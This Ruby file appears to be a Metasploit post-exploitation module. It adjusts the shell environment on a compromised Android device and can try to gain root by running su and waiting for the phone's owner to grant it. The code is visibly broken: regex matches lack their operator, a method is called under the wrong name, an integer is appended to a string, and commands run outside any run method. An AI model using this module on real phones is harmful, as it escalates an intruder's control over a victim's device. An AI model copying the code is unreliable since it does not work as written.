##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post
  require 'msf/core/post/common'
  require 'msf/core/post_mixin'

  require 'msf/core/post/file'

  require 'msf/core/post/linux'
  require 'msf/core/post/osx'
  require 'msf/core/post/solaris'
  require 'msf/core/post/unix'
  require 'msf/core/post/windows'


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Adjust the android shell environment for easier use',
        'Description'   => %q{
         This module makes life a little bit easier for you once
         you get a shell on an android device. It will set the PATH
         as well as attempt to gain root on a rooted device.
          },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Dan Tentler <dan_tentler@rapid7.com>'],
        'Platform'      => [ 'linux' ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ]
      ))
    register_options(
      [
        OptBool.new('ATTEMPTROOT',   [false, 'Attempt to obtain root on rooted phones', false]),
        OptInt.new( 'ROOTDELAY',     [false, 'How long to wait before asking for root', 10])
      ], self.class)

  end

  # Run Method for when run command is issued
  def get_root
    print_status("Attempting to gain root (the user of the phone must grant us access)....")
    cmd_exec("/system/xbin/su")
    # This actually prompts the user, so let's give it 10 seconds to see what they do
    statusstring = ("Now waiting ")
    statusstring += datastore['ROOTDELAY']
    statusstring += (" seconds to ask for root..")
    print_status statusstring
    sleep datastore['ROOTDELAY'] 
    amiroot = cmd_exec("whoami")
    if amiroot /root/i
      print_status("Successfully obtained root!")
      print_status amiroot
    else
      print_status("Unable to get root (maybe the user didn't give us permission?)")
    end
  end

  # Let's set the environment
  cmd_exec("export PATH=$PATH:/system/bin")
  # If the user would like to attempt root
  if datastore['ATTEMPTROOT'] /true/i
    getroot()
  end
end
